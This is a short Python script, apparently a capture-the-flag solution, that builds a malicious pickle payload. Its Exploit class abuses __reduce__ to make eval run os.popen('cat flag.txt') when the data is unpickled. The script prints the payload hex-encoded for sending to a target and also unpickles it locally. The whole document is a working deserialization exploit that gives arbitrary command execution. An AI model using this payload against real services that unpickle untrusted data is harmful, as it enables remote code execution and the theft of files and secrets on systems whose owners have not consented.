import pickle
import binascii

class Exploit(object):
    def __reduce__(self):
        return (eval, ('(__import__("os").popen("cat flag.txt").read(),1,1)',))
payload = pickle.dumps(Exploit())
print(binascii.hexlify(payload))
print(pickle.loads(payload))

